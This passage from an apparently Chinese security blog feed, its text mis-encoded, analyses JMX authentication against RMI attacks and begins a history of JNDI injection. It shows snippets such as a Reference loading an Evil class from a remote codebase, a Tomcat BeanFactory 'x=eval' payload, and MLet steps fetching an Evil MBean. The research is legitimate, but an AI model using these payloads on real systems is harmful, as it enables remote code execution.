class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.interceptor</span>.DefaultMBeanServerInterceptor<span class="hljs-selector-id">#createMBean</span>(<br>....<br></code></pre></td></tr></table></figure><p>æœ‰é‰´æƒæ—¶ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#createMBean</span>(java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.String</span>, javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.ObjectName</span>, javax<span class="hljs-selector-class">.security</span><span class="hljs-selector-class">.auth</span>.Subject)<br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doPrivilegedOperation</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.RMIConnectionImpl</span>.PrivilegedOperation<span class="hljs-selector-id">#run</span><br>javax<span class="hljs-selector-class">.management</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.rmi</span>.RMIConnectionImpl<span class="hljs-selector-id">#doOperation</span><br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jmx</span><span class="hljs-selector-class">.remote</span><span class="hljs-selector-class">.security</span>.MBeanServerAccessController<span class="hljs-selector-id">#createMBean</span>   å½“åŠ ä¸Šé‰´æƒååœ¨è¿™é‡Œå‘ç”Ÿäº†å˜åŒ–<br>...<br></code></pre></td></tr></table></figure><p>ç¿»äº†ä¸‹æºç ç»Ÿè®¡ä¸‹jmxé…ç½®æ–‡ä»¶ä¸­çš„æƒé™å¯å¯¹åº”è°ƒç”¨MBeançš„å“ªäº›æ“ä½œã€‚è¿™äº›æ“ä½œå¯ä»¥è¾…åŠ©æˆ‘ä»¬å¯¹JMXæœåŠ¡è¿›è¡Œè¿›ä¸€æ­¥çš„æµ‹è¯•ï¼š</p><p>readæƒé™å¯æ‰§è¡Œçš„æ“ä½œ</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">getAttributeã€getAttributesã€getDefaultDomainã€getDomainsã€getMBeanCountã€getMBeanInfoã€getObjectInstanceã€isInstanceOfã€isRegisteredã€<span class="hljs-keyword">query</span>MBeansã€<span class="hljs-keyword">query</span>Namesã€addNotificationListenerã€removeNotificationListener<br></code></pre></td></tr></table></figure><p>Writeæƒé™å¯æ‰§è¡Œçš„æ“ä½œ</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">set</span>Attributeã€<span class="hljs-keyword">set</span>Attributes<br></code></pre></td></tr></table></figure><p>Unregisteræƒé™å¯æ‰§è¡Œçš„æ“ä½œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">unregisterMBean</span><br></code></pre></td></tr></table></figure><p>writeæƒé™ã€éMLet#addURL&#x2F;getMBeansFromURLæ–¹æ³•å¯æ‰§è¡Œçš„æ“ä½œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">invoke</span><br></code></pre></td></tr></table></figure><p>readæƒé™å¯ä»¥æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œå¦‚åˆ—å‡ºå…¨éƒ¨MBeançš„ä¿¡æ¯</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/40.png"></p><p>æˆ‘ä»¬ä»¥ä½æƒé™è´¦æˆ·guestç™»å½•åå†æ¬¡æµ‹è¯•å¦‚ä¸Šå‡ ç§åˆ©ç”¨æ–¹å¼</p><h3 id="3-1-å½±å“åœ°å€å¯æ§çš„JNDIæ³¨å…¥-amp-RMI-Registryåˆ©ç”¨æ–¹å¼-amp-CVE-2016-3427"><a href="#3-1-å½±å“åœ°å€å¯æ§çš„JNDIæ³¨å…¥-amp-RMI-Registryåˆ©ç”¨æ–¹å¼-amp-CVE-2016-3427" class="headerlink" title="3.1 å½±å“åœ°å€å¯æ§çš„JNDIæ³¨å…¥ &amp; RMI Registryåˆ©ç”¨æ–¹å¼ &amp; CVE-2016-3427"></a>3.1 å½±å“åœ°å€å¯æ§çš„JNDIæ³¨å…¥ &amp; RMI Registryåˆ©ç”¨æ–¹å¼ &amp; CVE-2016-3427</h3><p>åœ°å€å¯æ§çš„JNDIæ³¨å…¥åˆ©ç”¨åœ¨å¯†ç é‰´æƒæµç¨‹ä¹‹å‰ï¼Œä¸æ˜¯å¦é‰´æƒæ— å…³ï¼Œåªä¸JDKç‰ˆæœ¬æœ‰å…³</p><p>RMIæ–¹å¼çš„åˆ©ç”¨åœ¨å¯†ç é‰´æƒæµç¨‹ä¹‹å‰ï¼Œä¸æ˜¯å¦é‰´æƒæ— å…³ï¼Œåªä¸JDKç‰ˆæœ¬æœ‰å…³</p><p>CVE-2016-3427æ˜¯åœ¨RMIå±‚-è¿˜åŸè‡ªå®šä¹‰æ–¹æ³•çš„å‚æ•°æ—¶è§¦å‘çš„ï¼Œä¸æ˜¯å¦é‰´æƒæ— å…³ï¼Œåªä¸JDKç‰ˆæœ¬æœ‰å…³</p><h3 id="3-2-å½±å“JMXå±‚MBeanæ–¹æ³•çš„åˆ©ç”¨æ–¹å¼"><a href="#3-2-å½±å“JMXå±‚MBeanæ–¹æ³•çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="3.2 å½±å“JMXå±‚MBeanæ–¹æ³•çš„åˆ©ç”¨æ–¹å¼"></a>3.2 å½±å“JMXå±‚MBeanæ–¹æ³•çš„åˆ©ç”¨æ–¹å¼</h3><p>ç”±äºé€šè¿‡JMXå±‚MBeanæ–¹æ³•getLoggerLevel&#x2F;gcClassHistogramåˆ©ç”¨æ–¹å¼æ˜¯åœ¨javax.management.remote.rmi.RMIConnectionImpl#invoke è¿˜åŸå‚æ•°æ—¶è§¦å‘çš„æ¼æ´ï¼Œå¹¶æœªæ‰§è¡Œåˆ°åˆ¤æ–­æƒé™çš„ä½ç½®ã€‚æ‰€ä»¥ä½¿ç”¨åªè¯»æƒé™çš„guestè´¦æˆ·å³å¯ç»§ç»­è¿›è¡Œåˆ©ç”¨</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/41.png"></p><h3 id="3-3-å½±å“MLETåŠ è½½Evil-MBeanåˆ©ç”¨æ–¹å¼"><a href="#3-3-å½±å“MLETåŠ è½½Evil-MBeanåˆ©ç”¨æ–¹å¼" class="headerlink" title="3.3 å½±å“MLETåŠ è½½Evil MBeanåˆ©ç”¨æ–¹å¼"></a>3.3 å½±å“MLETåŠ è½½Evil MBeanåˆ©ç”¨æ–¹å¼</h3><p>å½“æœªæˆæƒæƒ…å†µä¸‹JMXæœåŠ¡ä¸‹MLETæ–¹å¼åˆ©ç”¨çš„æ­¥éª¤</p><p>1ã€å®¢æˆ·ç«¯è°ƒç”¨<code>JMXConnectorFactory.connect</code>è¿æ¥åˆ°JMXæœåŠ¡ç«¯</p><p>2ã€è°ƒç”¨createMBeanåˆ›å»ºjavax.management.loading.MLet MBean</p><p>3ã€invokeè°ƒç”¨MLet#getMBeansFromURLæ“ä½œä»å¤–éƒ¨è·å–Evil MBean</p><p>4ã€invokeè°ƒç”¨Evil MBeançš„runCommandæ“ä½œæ‰§è¡Œå‘½ä»¤</p><p>å½“ä»¥ä½æƒé™è´¦æˆ·ç™»å½•åï¼Œåœ¨ç¬¬2æ­¥com.sun.jmx.remote.security.MBeanServerAccessController#createMBeanåˆ›å»ºbeançš„èµ·ç‚¹ä½¿ç”¨<code>checkCreate(className)</code>æ£€æŸ¥æƒé™ï¼Œæ‰§è¡Œåˆ°com.sun.jmx.remote.security.MBeanServerFileAccessController#checkAccessä»£ç é€»è¾‘ï¼š1ã€è·å–å½“å‰ç™»å½•ç”¨æˆ·çš„æƒé™ï¼›2ã€åˆ¤æ–­æƒé™æ˜¯å¦åŒ…æ‹¬createæƒé™ï¼›3ã€å¦‚æœæ— createæƒé™æˆ–æœªç™»å½•ç”¨æˆ·åˆ™æŠ¥é”™ï¼š<code>Access denied! Invalid access level for requested MBeanServer operation</code></p><p><img src="/img/How-to-attack-RMI-based-JMX-services/42.png"></p><p>è€Œæˆ‘ä»¬ç™»å½•ä½¿ç”¨çš„guestç”¨æˆ·åªæœ‰readæƒé™ï¼Œæ²¡æ³•æ‰§è¡ŒcreateBeanæ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡ŒEXPçš„å®¢æˆ·ç«¯æŠ¥é”™ï¼š</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/43.png"></p><p>å¦å¤–å¦‚æœç™»å½•ç”¨æˆ·æœ‰createæƒé™è¿˜æ˜¯ä¸èƒ½invokeè°ƒç”¨MLet#getMBeansFromURLæ“ä½œçš„ï¼Œå› ä¸ºåœ¨invokeå‰ä¼šæ£€æŸ¥writeã€MLetMethodsæƒé™ï¼Œwriteæƒé™ä¸ä¸Šé¢åˆ¤æ–­readæƒé™çš„æµç¨‹ä¸€è‡´ï¼Œè€ŒMLetMethodsæƒé™æ˜¯åœ¨com.sun.jmx.remote.security.MBeanServerAccessController#checkMLetMethodsä¸­åˆ¤æ–­çš„ï¼Œå¦‚æœè°ƒç”¨javax.management.loading.MLetçš„addURL&#x2F;getMBeansFromURLéƒ½ä¼šæŠ¥é”™é€€å‡º</p><p><img src="/img/How-to-attack-RMI-based-JMX-services/44.png"></p><h2 id="4ã€å‚è€ƒ"><a href="#4ã€å‚è€ƒ" class="headerlink" title="4ã€å‚è€ƒ"></a>4ã€å‚è€ƒ</h2><p><a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/853f699a5273</a></p><p><a href="https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/">https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/</a></p><p><a href="https://www.cnblogs.com/afanti/p/12468693.html">https://www.cnblogs.com/afanti/p/12468693.html</a></p><p><a href="https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl">https://github.com/veracode-research/solr-injection#2-cve-2019-0192-deserialization-of-untrusted-data-via-jmxserviceurl</a></p><p><a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/">https://pwnull.github.io/2022/Exploring-JAVA-RMI&#39;s-offensive-and-defensive-history/</a></p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JMX</tag>
      
      <tag>JavaSec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å½“æˆ‘ä»¬è°ˆè®ºJNDIæ³¨å…¥æ—¶ï¼Œæˆ‘ä»¬åœ¨è°ˆè®ºä»€ä¹ˆ</title>
    <link href="/2022/jndi-injection-history/"/>
    <url>/2022/jndi-injection-history/</url>
    
    <content type="html"><![CDATA[<p>JNDIæ³¨å…¥çš„åˆ©ç”¨æ ¹æ®JDKæ›´æ–°å†å²å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œç¬¬ä¸€é˜¶æ®µæ˜¯åœ¨JDK8u191ä¹‹å‰ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è‡ªæ­å»ºçš„RMI&#x2F;LDAPæ¶æ„æœåŠ¡å™¨ï¼Œè®©å®¢æˆ·ç«¯å»è·å–å¹¶åŠ è½½æˆ‘ä»¬æ”¾ç½®çš„æ¶æ„ç±»ï¼Œè¯¥é˜¶æ®µçš„åˆ©ç”¨æ‰‹æ³•ä¸å—classpathæ˜¯å¦æ‹¥æœ‰Gadgetçš„é™åˆ¶ã€‚ç¬¬äºŒé˜¶æ®µæ˜¯åœ¨JDK8u191ä¹‹åï¼ŒJDKå¢åŠ äº†trustURLCodebaseé…ç½®å¯¼è‡´è¿™ç§åŠ è½½æ¶æ„ç±»çš„æ–¹å¼å¤±æ•ˆï¼Œè¿›è€Œæ‰¾å‡ºäº† javaSerializedDataã€javaReferenceAddressæ”¾ç½®Gadgetã€ObjectFactory#getObjectInstanceè§¦å‘æ•æ„Ÿæ–¹æ³•çš„æ–¹å¼ï¼Œè¿™ç§æ–¹å¼è™½ç„¶ä¸å—JDKç‰ˆæœ¬çš„é™åˆ¶ï¼Œä½†æ˜¯å—é™äºç›®æ ‡çš„classpathæ˜¯å¦æ‹¥æœ‰å¯åˆ©ç”¨çš„Gadgetã€‚è€Œå¯»æ‰¾é€šç”¨æ€§æ›´å¼ºã€ä½¿ç”¨èŒƒå›´æ›´å¹¿çš„Gadgeté“¾è¿˜å€¼å¾—æ·±å…¥ç ”ç©¶ã€‚</p><p>JNDIæ³¨å…¥å®é™…ä¸Šå°±æ˜¯æ§åˆ¶lookup()çš„å‚æ•°ï¼Œä½¿å®¢æˆ·ç«¯å»è®¿é—®æ¶æ„çš„RMI&#x2F;LDAPæœåŠ¡å»åŠ è½½æ¶æ„å¯¹è±¡ï¼Œä»è€Œå®Œæˆä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨ã€‚æŒ‰ç…§åˆ©ç”¨æ‰‹æ³•å¯ä»¥åˆ†ä¸ºï¼šReference#codebaseçš„åˆ©ç”¨ã€æœ¬åœ°ClassPathçš„Gadgetåˆ©ç”¨ã€æœ¬åœ°ClassPathçš„ObjectFactory+Gadgetçš„åˆ©ç”¨ã€‚</p><p>ç¯å¢ƒç›¸å…³ï¼š</p><p>æœ¬æ¬¡æµ‹è¯•ä½¿ç”¨ç‰ˆæœ¬ï¼šJDK8u112ã€JDK8u121ã€JDK8u144ã€JDK8u191ã€JDK8u341</p><p>JDKç‰ˆæœ¬ä¸‹è½½ï¼š<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><h2 id="1ã€JNDI-with-RMI"><a href="#1ã€JNDI-with-RMI" class="headerlink" title="1ã€JNDI with RMI"></a>1ã€JNDI with RMI</h2><h3 id="1-1-RMI-Reference-codebase-çš„è¿œç¨‹åˆ©ç”¨"><a href="#1-1-RMI-Reference-codebase-çš„è¿œç¨‹åˆ©ç”¨" class="headerlink" title="1.1 RMI Reference#codebase çš„è¿œç¨‹åˆ©ç”¨"></a>1.1 RMI Reference#codebase çš„è¿œç¨‹åˆ©ç”¨</h3><p>åœ¨ä½¿ç”¨lookupæŸ¥æ‰¾è·å–è¿œç¨‹æœåŠ¡å™¨ä¸Šç»‘å®šçš„å¯¹è±¡æ—¶ï¼Œè‹¥æŒ‡å®šçš„è¿œç¨‹åœ°å€ä¸ºrmiï¼Œåˆ™ä¼šè¿›å…¥com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)æµç¨‹ï¼Œå¦‚æœæ‹¿åˆ°çš„æ˜¯Referenceå¯¹è±¡ï¼Œé‚£ä¹ˆä¼šè¿›å…¥åˆ°åŠ è½½Factoryçš„ä»£ç é€»è¾‘ï¼Œè°ƒç”¨æ ˆåŠåŸç†å¦‚ä¸‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#lookup</span>(javax<span class="hljs-selector-class">.naming</span>.Name)<br>com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.jndi</span><span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span>.RegistryContext<span class="hljs-selector-id">#decodeObject</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager<span class="hljs-selector-id">#getObjectInstance</span><br>javax<span class="hljs-selector-class">.naming</span><span class="hljs-selector-class">.spi</span>.NamingManager#getObjectFactoryFromReference<br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨æœ¬åœ°classpathä¸­æ‰¾ä¸åˆ°æˆ‘ä»¬æŒ‡å®šçš„factoryç±»ï¼ˆ1ï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šå»è¿œç¨‹codebaseï¼ˆ2ï¼‰å»ä¸‹è½½classå­—èŠ‚ç ï¼ˆ3ï¼‰å›æ¥å¹¶å®ä¾‹åŒ–ï¼ˆ4ï¼‰ã€‚ å›¾ä¸ºJDK8u112çš„ä»£ç </p><p><img src="/img/JNDI-injection-history/1.png"></p><p>è‹¥JDK8u112ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬æŒ‡å®šcodebaseä¸ºhttpåœ°å€ï¼Œæ”¾ç½®æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»ï¼Œlookupå‘èµ·è¯·æ±‚å³å¯æ‰§è¡ŒEvilç±»é™æ€ä»£ç å—ä¸­çš„ä»£ç </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">Reference</span> <span class="hljs-keyword">reference</span> = new <span class="hljs-keyword">Reference</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://192.168.232.145:8888/&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/2.png"></p><p>ä¿®å¤ï¼šcom.sun.jndi.rmi.registry.RegistryContext#decodeObjectåœ¨JDK 8u121æ—¶å¢åŠ äº†trustURLCodebase&#x3D;falseçš„é…ç½®ï¼Œè¿™æ ·å°±é€ æˆï¼šå¦‚æœæƒ³é€šè¿‡ä¸‹å›¾æ ‡ç­¾1çš„åˆ¤æ–­è€Œä¸æŠ¥é”™é€€å‡ºï¼Œåªèƒ½è®©codebase(var8.getFactoryClassLocation())ä¸ºç©ºï¼Œè¿™æ ·factoryåªèƒ½ä¸ºæœ¬åœ°ç±»ï¼Œæ— æ³•å»å¤–éƒ¨åŠ è½½æ¶æ„ç±»äº†</p><p><img src="/img/JNDI-injection-history/3.png"></p><h2 id="2ã€Tomcat-BeanFactory-getObjectInstanceçš„æœ¬åœ°åˆ©ç”¨"><a href="#2ã€Tomcat-BeanFactory-getObjectInstanceçš„æœ¬åœ°åˆ©ç”¨" class="headerlink" title="2ã€Tomcat BeanFactory#getObjectInstanceçš„æœ¬åœ°åˆ©ç”¨"></a>2ã€Tomcat BeanFactory#getObjectInstanceçš„æœ¬åœ°åˆ©ç”¨</h2><p>æˆ‘ä»¬çœ‹ä¸‹å¦‚ä½•å»ç»•è¿‡ä¿®å¤è¡¥ä¸ï¼Œåœ¨æ¶æ„æœåŠ¡å™¨åˆ›å»ºReferenceå¯¹è±¡æ—¶ï¼Œå¯ä»¥æŒ‡å®šclassFactoryLocationä¸ºç©ºï¼Œè¿™æ ·å°±ä¼šè¿‡æ‰ä¸Šå›¾æ ‡ç­¾1çš„åˆ¤æ–­</p><p><img src="/img/JNDI-injection-history/4.png"></p><p><img src="/img/JNDI-injection-history/5.png"></p><p>æ¥ç€ç»§ç»­è°ƒç”¨åˆ°javax.naming.spi.NamingManager#getObjectInstanceï¼Œåœ¨è¯¥æ–¹æ³•ä¸­å®Œæˆä¸‰æ­¥ï¼šclassFactoryç±»åè·å–ï¼ˆ1ï¼‰ã€classFactoryçš„å®ä¾‹åŒ–ï¼ˆ2ï¼‰ã€è°ƒç”¨getObjectInstanceæ–¹æ³•ï¼ˆ3ï¼‰ã€‚åœ¨ä¸Šä¸€ç« èŠ‚è§¦å‘ä»£ç æ‰§è¡Œçš„æ˜¯2ä¸­classFactoryçš„å®ä¾‹åŒ–ï¼Œç°åœ¨ç”±äºè¡¥ä¸çš„é™åˆ¶å¯¼è‡´classFactoryLocationä¸ºç©ºï¼Œæ‰€ä»¥classFactoryåªèƒ½æŒ‡å®šä¸ºæœ¬åœ°ClassPathä¸­å­˜åœ¨çš„ç±»ï¼Œç³»ç»Ÿåœ¨å®ä¾‹åŒ–åä¼šè°ƒç”¨classFactory#getObjectInstanceæ–¹æ³•ï¼Œå³ä¸‹å›¾çš„æ ‡ç­¾3</p><p><img src="/img/JNDI-injection-history/6.png"></p><p>é‚£ä¹ˆç°åœ¨æƒ³è¦ç»§ç»­å®Œæˆæ¼æ´åˆ©ç”¨ï¼Œéœ€è¦åœ¨æœ¬åœ°ClassPathä¸­æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œå…¶å®ç°äº†javax.naming.spi.ObjectFactoryæ¥å£ã€ä¸”é™æ€ä»£ç å—&#x2F;getObjectInstanceæ–¹æ³•å­˜åœ¨æ•æ„Ÿæ“ä½œã€‚ Veracodeæ‰¾åˆ°äº†Tomcatä¸­çš„org.apache.naming.factory.BeanFactoryï¼ŒTomcatçš„ä½¿ç”¨ç›¸å½“å¹¿æ³›ï¼Œæ‰€ä»¥è¿™ä¸ªé“¾çš„å®æˆ˜ä»·å€¼è¿˜æ˜¯å¾ˆé«˜çš„</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>pom.xmlæ·»åŠ å¼•å…¥Tomcatåï¼Œæˆ‘ä»¬åˆ†æä¸‹è¿™æ¡é“¾ï¼šorg.apache.naming.factory.BeanFactory#getObjectInstanceæ–¹æ³•ä¸­ä¼šå¯¹ä¼ å…¥çš„classNameè¿›è¡Œå®ä¾‹åŒ–ã€ä½¿ç”¨JDKçš„å†…çœæœºåˆ¶java.beans.Introspector#getBeanInfo  è·å–å±æ€§ï¼ˆå­˜åœ¨getter&#x2F;setteræ–¹æ³•çš„å±æ€§æ‰ä¼šè¢«è¯†åˆ«ï¼‰ï¼Œä½†åŒæ—¶è¯¥æ–¹æ³•ä¹Ÿæä¾›äº†â€åˆ«åæœºåˆ¶â€œï¼šåŸºäºä¼ å…¥çš„forceStringå­—ç¬¦ä¸²ï¼Œæ ¹æ®&#x3D;åˆ†å‰²æ‹¿åˆ°è¦æ‰§è¡Œçš„â€setteråˆ«åæ–¹æ³•â€åŠStringç±»å‹çš„å‚æ•°å€¼ï¼Œæœ€åè°ƒç”¨åå°„æ‰§è¡Œã€‚è¿™æ ·Gadgetçš„sourceç‚¹å°±ä»â€ObjectFactoryæ¥å£å®ç°ç±»çš„getObjectInstanceæ–¹æ³•â€å˜æˆäº†â€æœ¬åœ°ä»»æ„ç±»åŒ…å«Stringç±»å‹å‚æ•°çš„æ–¹æ³•â€</p><p><img src="/img/JNDI-injection-history/7.png"></p><p><img src="/img/JNDI-injection-history/8.png"></p><p>è€ŒTomcat8è‡ªå¸¦çš„javax.el.ELProcessor#eval(String)æ»¡è¶³è¯¥æ¡ä»¶ï¼Œå¯æ‰§è¡Œä¼ å…¥çš„javaä»£ç è¿›è¡Œåˆ©ç”¨ã€‚</p><p><img src="/img/JNDI-injection-history/9.png"></p><p>æ„é€ æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;evil code&quot;</span>));<br></code></pre></td></tr></table></figure><p>åˆ†å‰²å¾—åˆ°evalæ–¹æ³•ã€Stringå‚æ•°ï¼Œæ·»åŠ è‡³forced mapä¸­</p><p><img src="/img/JNDI-injection-history/10.png"></p><p>æœ€ç»ˆä»forcedæ‹¿å‡ºæ–¹æ³•ï¼Œåˆ©ç”¨åå°„æ‰§è¡Œjavax.el.ELProcessor#eval(â€œevil codeâ€)</p><p><img src="/img/JNDI-injection-history/11.png"></p><p>è‡³æ­¤ï¼Œç»•è¿‡äº†JDK8u121çš„ä¿®å¤</p><h2 id="3ã€JNDI-with-Ldap"><a href="#3ã€JNDI-with-Ldap" class="headerlink" title="3ã€JNDI with Ldap"></a>3ã€JNDI with Ldap</h2><h3 id="3-1ã€Ldap-javaSerializedDataçš„æœ¬åœ°åˆ©ç”¨"><a href="#3-1ã€Ldap-javaSerializedDataçš„æœ¬åœ°åˆ©ç”¨" class="headerlink" title="3.1ã€Ldap javaSerializedDataçš„æœ¬åœ°åˆ©ç”¨"></a>3.1ã€Ldap javaSerializedDataçš„æœ¬åœ°åˆ©ç”¨</h3><p>ä¸Šé¢è®²åˆ°äº†åˆ©ç”¨æ¶æ„RMIæœåŠ¡å™¨è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼Œåœ¨JDKä¸­è¿˜æœ‰ldapå¯ä»¥ä½¿ç”¨ã€‚å½“lookupè¯·æ±‚åœ°å€çš„åè®®ä¸ºldapæ—¶ï¼Œä¼šèµ°åˆ°com.sun.jndi.ldap.LdapCtx#c_lookupè¿›è¡Œå¤„ç†è§£æã€‚ä»æ•´ä½“çš„ä»£ç ç»“æ„çœ‹ï¼Œæ¶‰åŠEXPæ„é€ çš„ä»£ç éƒ¨åˆ†æœ‰4å¤„ï¼š1è·å–ldapè¯·æ±‚çš„ç»“æœã€2è§£æç»“æœæ‹¿åˆ°attributeå±æ€§å€¼ã€3æ ¹æ®attributeçš„å±æ€§ç»„è£…Referenceç±»ã€4åŠ è½½è¿œç¨‹çš„æ¶æ„classå¹¶å®ä¾‹åŒ–é€ æˆä»£ç æ‰§è¡Œã€‚å…¶ä¸­ç¬¬4æ­¥ä¸ä¸Šç« èŠ‚ä¸­çš„JNDI_RMIè§£æè°ƒç”¨æµç¨‹ä¸€è‡´ï¼Œä½†æ˜¯JDK8u121æ˜¯åœ¨RegistryContext#decodeObjectå±‚åšçš„trustURLCodebaseä¿®å¤é™åˆ¶ï¼Œä¸ldapä½¿ç”¨codebaseåŠ è½½factoryç±»çš„æµç¨‹æ— å…³è”ã€‚æ‰€ä»¥JNDI_RMIçš„ä¿®å¤æ–¹æ¡ˆå¹¶ä¸å½±å“JNDI_LDAPçš„åˆ©ç”¨</p><p><img 